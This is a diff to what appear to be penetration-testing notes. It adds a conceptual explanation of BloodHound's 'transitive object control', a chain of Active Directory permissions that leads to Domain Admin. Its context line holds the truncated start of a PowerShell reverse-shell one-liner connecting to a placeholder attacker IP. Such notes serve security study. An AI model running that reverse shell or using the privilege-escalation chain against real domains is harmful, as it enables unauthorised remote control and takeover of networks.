@@ -29,3 +29,16 @@ $client = New-Object System.Net.Sockets.TCPClient('<OUR ip>',<port>);$stream = $
 
 ----------------------------------------------------------------------------------------------------------------------
 
+transitive object control in bloodhound
+---
+
+In BloodHound, "transitive object control" refers to an attack path where an attacker gains indirect control over a sensitive object (such as a user, group, or computer) by exploiting multiple relationships or permissions in Active Directory. This often results from a chain of misconfigurations where control over one object enables control over another, eventually leading to higher privileges, such as Domain Admin.<br>
+Transitive control **occurs** when an attacker doesn’t have direct control over a target object but can use their control over another object to eventually gain access to the target.
+For example:
+
+    Attacker controls UserA.
+    UserA has control over GroupB.
+    GroupB contains a privileged user, like a Domain Admin.
+    The attacker can then leverage control over UserA to modify GroupB and escalate privileges
+
+
